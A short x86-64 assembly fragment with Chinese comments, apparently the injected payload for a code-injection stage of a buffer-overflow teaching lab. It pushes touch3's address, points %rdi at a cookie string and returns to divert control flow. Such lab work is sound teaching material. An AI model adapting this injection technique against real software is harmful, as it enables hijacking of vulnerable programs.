pushq	$0x4018fa		# 压入 touch3 的起始地址
movq	$0x5561dca8,%rdi        # 设置 touch3 的参数 sval 指向 cookie 的字符串表示
retq				# 弹出 touch3 的起始地址赋值给 PC
